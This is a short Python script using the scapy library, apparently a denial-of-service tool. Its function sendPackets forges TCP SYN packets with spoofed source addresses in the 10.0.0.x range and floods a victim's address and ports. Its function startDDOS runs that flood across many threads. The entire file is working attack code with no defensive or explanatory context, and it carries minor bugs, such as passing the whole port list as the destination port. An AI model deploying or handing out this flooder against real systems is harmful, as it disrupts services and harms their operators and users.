from scapy.all import *
from threading import Thread
import time

def sendPackets(victimAddress,victimPort):
	for port in victimPort:
		for i in range(1,254):
			packetSYN=IP(src="10.0.0." + str(i), dst=victimAddress,id=1111,ttl=99)/TCP(sport=RandShort(),dport=victimPort,seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
			print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
			ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)

def startDDOS(victimAddress,victimPort,numThreads):
	for i in range(numThreads):
		thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
		thread.start()
